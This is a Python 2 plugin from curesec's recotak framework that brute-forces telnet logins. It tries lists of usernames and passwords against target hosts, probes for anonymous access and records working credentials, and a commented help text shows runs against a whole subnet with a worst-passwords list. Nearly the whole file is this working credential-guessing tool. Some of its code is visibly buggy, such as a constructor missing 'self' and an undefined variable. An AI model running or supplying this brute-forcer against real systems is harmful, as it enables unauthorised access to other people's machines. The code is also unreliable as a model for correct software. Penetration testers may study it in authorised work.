#!/usr/bin/env python2

# Copyright (c) 2014, curesec GmbH
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification,
# are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice, this list of
# conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice, this list
# of conditions and the following disclaimer in the documentation and/or other materials
# provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors may be used
# to endorse or promote products derived from this software without specific prior written
# permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS
# OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
# EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
# HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
# TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
# EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

from recotak import *
from ctools import cTelnet
from datetime import datetime
import itertools as it
import threading
import re
import sqlalchemy as sql
logger = rLog.log


class TelnetBfResult(ServiceResult):

    columns = [sql.Column('anon_login', sql.Boolean), ]

    def __init__(
        ip='0.0.0.0',
        fqdn='',
        domain='',
        root_zone='',
        port=0,
        state='',
        protocol='',
        service='',
        version='',
        info='',
        anon_login=False
    ):
        super(TelnetBfResult, self).__init__(
            ip,
            fqdn,
            domain,
            root_zone,
            port,
            state,
            protocol,
            service,
            version,
            info)
        self.anon_login = anon_login


desc = {
    'cli': {
        'check_anon': {
            'name_or_flags': ['-ca', '--check_anon'],
            'help': 'check for anonymous logins',
            'action': 'store_true',
        }
    },

    'defaults': {
        'Port': [23],
        'Target': ['127.0.0.1'],
    },

    "plgclass": ["bruteforce"],

    #plgin name
    "plgname": "telnetbf",

    # description
    "desc": "telnet bruteforcer",

    #root?
    "gainroot": False,

    #interaktiv
    "interactive": False,

    #direct connection
    "direct": False,

    #rank
    "rank": "experimental",
}


CRLF = '\r\n'

def brute(target, port, user, passw):
    ip = target[0]
    port = int(port)

    if (ip, port) in brute.anon_users:
        raise StopIteration

    status = False
    ustr = user + '@' + ip + ':' + str(port)
    if ustr in brute.inv_users:
        logger.info('found %s in inv users' % ustr)
        raise StopIteration

    logger.info('%s', ip)
    logger.info('%s', port)
    logger.info('%s', user)
    logger.info('%s', passw)
    tn = None

    try:
        tn = cTelnet.Telnet(
            ip,
            port=int(port),
            timeout=brute.to,
            use_ssl=brute.tls,
            verbose=False,
            # out=ustr + '.dbg'
        )
        tn.connect()
    except Exception as e:
        if tn:
            tn.close()
            logger.warning('Could not establish connection to telnet server %s:%d -> %s',
                           ip, port, e)
        raise StopIteration
    try:
        match = tn.expect((re.compile('login', re.IGNORECASE),
                           re.compile('username', re.IGNORECASE)),
                          timeout=5,
                          )
        if not match:
            return
        tn.write(user + CRLF)
        match = tn.expect((re.compile('password', re.IGNORECASE),
                           re.compile('incorrect', re.IGNORECASE)),
                          timeout=5,
                          )
        if not match:
            return
        if match.group().lower() not in ['incorrect', ]:
            tn.write(passw + CRLF)
            match = tn.expect((re.compile('last login', re.IGNORECASE),
                               re.compile('incorrect', re.IGNORECASE)),
                              timeout=5,
                              )
        if match and match.group().lower() in ['last login', ]:
            status = True
            with brute.lock:
                logger.info('adding %s to inv users' % ustr)
                brute.inv_users.append(ustr)
    except Exception, e:
        logger.warning('Error while communicating with %s:%d -> %s',
                       ip, port, e)
        logger.warning(e)
    r = (status, user, passw, ip, port)
    logger.info(repr(r))
    yield r
    if tn:
        tn.close()

    raise StopIteration


def main(dbh,
         target=[],
         port=[],
         user=[],
         password=[],
         check_anon=False,
         **kwargs):

    logger.debug("starting plugin %s", __name__)
    telnetb = TelnetBruteforce(
        target,
        port,
        user,
        password,
        check_anon,
        dbh=dbh)
    telnetb.start()


def register():
    plugin = Plugin2(**desc)
    plugin.execute = main
    return plugin


brute.tls = False
brute.to = 3
brute.inv_users = []
brute.lock = threading.Lock()
brute.anon_users = []


class TelnetBruteforce():
    def __init__(self,
                 ig_targets,
                 ig_port,
                 ig_user,
                 ig_passw,
                 check_anon,
                 dbh=None):

        """
        Initialize and run TelnetBruteforce

        input:
            args            cmdline arguments without argv[0]
            dbh       database handler
        """

        self.dbh = dbh

        # configure bruteforce parameters for all targets
        brute.to = 60
        brute.tls = False

        if check_anon:
            tuples = cTuples.cTuples(inputs=[
                ig_targets,
                ig_port,
                it.cycle(['anonymous', 'telnet', 'main@example.com', '']),
                it.cycle(['anonymous', 'telnet', 'mail@example.com', ''])
            ],
                prep_callback=brute,
            )
            tuples.start()

            for status, username, password, host, port in tuples.tuple_q:
                if status:
                    brute.anon_users.append((host, port))
                    dbh.add(TelnetBfResult(
                        ip=host,
                        port=port,
                        service='telnet',
                        state='open',
                        protocol='tcp',
                        anon_login=True
                    )
                    )

            tuples.join()
            brute.anon_users = anon_users

        print 'Bruteforcing Telnet logins ...'
        self.tuples = cTuples.cTuples(inputs=[ig_targets, ig_port, ig_user, ig_passw],
                                      prep_callback=brute,
                                      )
        self.tuples.start()

    def start(self):

        """ Do the thing """

        start_time = datetime.now()

        row_fmt = "{:30} {:30} {:30}"
        print '-' * 80
        print row_fmt.format('password', 'username', 'server')
        print '-' * 80
        for status, username, password, host, port in self.tuples.tuple_q:
            if status:
                print row_fmt.format(password, username, host + ':' + str(port))
                if self.dbh:
                    ip = ''
                    fqdn = ''
                    typ = cUtil.getTargetType(host)
                    if typ == cUtil.TTYPE.IP:
                        ip = host
                    if typ == cUtil.TTYPE.DOMAIN:
                        fqdn = host
                    br = BruteforceResult(
                        ip=ip,
                        fqdn=fqdn,
                        port=int(port),
                        username=username,
                        password=password,
                        service='telnet',
                        state='open',
                        protocol='tcp'
                    )
                    self.dbh.add(br)

        self.tuples.join()

        print '-' * 80
        print "Finished in %fs" % cUtil.secs(start_time)

#
#def parse(args):
#    parser = argparse.ArgumentParser(
#        prog=__plgname__,
#        description="Bruteforce telnet logins",
#        epilog=
#        """Examples:
#        telnet_bruteforce.plg -P 500-worst-passwords.txt -U userlist.txt -nt 100 -t 192.168.170.0/24
#        telnet_bruteforce.plg -p pass -u duser -t 192.168.170.136 -port 23
#        """,
#        formatter_class=argparse.RawTextHelpFormatter
#    )
#    parser.add_argument('-T',
#                        help='file containing host[:port] entries',
#                        dest='target_fn'
#                        )
#    parser.add_argument('-t',
#                        help='target targets',
#                        nargs='+',
#                        dest='targets',
#                        default=[]
#                        )
#    parser.add_argument('-port',
#                        help='target port (default 23)',
#                        dest='port',
#                        default=23,
#                        type=int
#                        )
#    parser.add_argument('-delay',
#                        help='delay in between bruteforce attempts',
#                        dest='delay',
#                        default=0.0,
#                        type=float
#                        )
#    parser.add_argument('-U',
#                        help='file containing username per line',
#                        dest='user_fn',
#                        )
#    parser.add_argument('-u',
#                        help='usernames',
#                        default=[],
#                        nargs='+',
#                        dest='users',
#                        )
#
#    parser.add_argument('-P',
#                        help='file containing password per line',
#                        dest='passw_fn',
#                        )
#    parser.add_argument('-p',
#                        help='passwords',
#                        default=[],
#                        nargs='+',
#                        dest='passw',
#                        )
#    parser.add_argument('-nt',
#                        help='number of threads (default 50, max 100)',
#                        dest='nthreads',
#                        type=int,
#                        default=50
#                        )
#    parser.add_argument('-to',
#                        help='Server timeout (default 3s)',
#                        dest='to',
#                        type=int,
#                        default=3
#                        )
#    parser.add_argument('-tls',
#                        help='use tls',
#                        dest='tls',
#                        action='store_true'
#                        )
#    parser.add_argument('-no_check',
#                        help='disable host check.' +
#                        'If you use this option, make sure not to use too many threads' +
#                        'as the open file limit easily gets exhausted',
#                        action='store_true',
#                        dest='no_check',
#                        )
#
#    if not args or not args[0]:
#        parser.print_help()
#        sys.exit(1)
#
#    opt = parser.parse_args(args)
#    opt.nthreads = max(100, opt.nthreads)
#
#    return opt

if __name__ == "__main__":
    import sys
    main(None, sys.argv[1:])
